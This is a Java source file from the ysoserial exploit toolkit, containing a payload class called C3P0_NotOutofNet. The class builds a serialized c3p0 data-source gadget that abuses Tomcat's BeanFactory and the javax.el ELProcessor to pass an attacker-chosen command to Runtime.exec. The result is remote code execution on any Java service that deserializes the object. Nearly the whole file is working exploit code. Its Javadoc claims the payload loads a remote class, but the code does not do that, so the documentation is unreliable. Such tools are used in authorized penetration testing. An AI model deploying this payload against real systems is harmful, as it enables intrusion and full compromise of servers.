package ysoserial.payloads;


import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;


/**
 *
 *
 * com.sun.jndi.rmi.registry.RegistryContext->lookup
 * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
 * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject
 *
 * Arguments:
 * - base_url:classname
 *
 * Yields:
 * - Instantiation of remotely loaded class
 *
 * @author m01e
 *
 */
@PayloadTest ( harness="ysoserial.test.payloads.RemoteClassLoadingTest" )
@Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-java:0.2.11"} )
@Authors({ Authors.MBECHLER })
public class C3P0_NotOutofNet implements ObjectPayload<Object> {
    public Object getObject ( String command ) throws Exception {

        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource2(command));
        return b;
    }

    private static final class PoolSource2 implements ConnectionPoolDataSource, Referenceable {
        private String cmdStr;

        public PoolSource2(String cmdStr) {
            this.cmdStr = cmdStr;
        }

        public Reference getReference () throws NamingException {
            //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
            ref.add(new StringRefAddr("forceString", "x=eval"));

            String expr1 =  "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('";
            String expr2 = "')\")";
            String expr = expr1 + cmdStr + expr2;
            System.out.println("expr=" + expr);

            //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
            ref.add(new StringRefAddr("x", expr));

            return ref;
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(C3P0_NotOutofNet.class, args);
    }

}
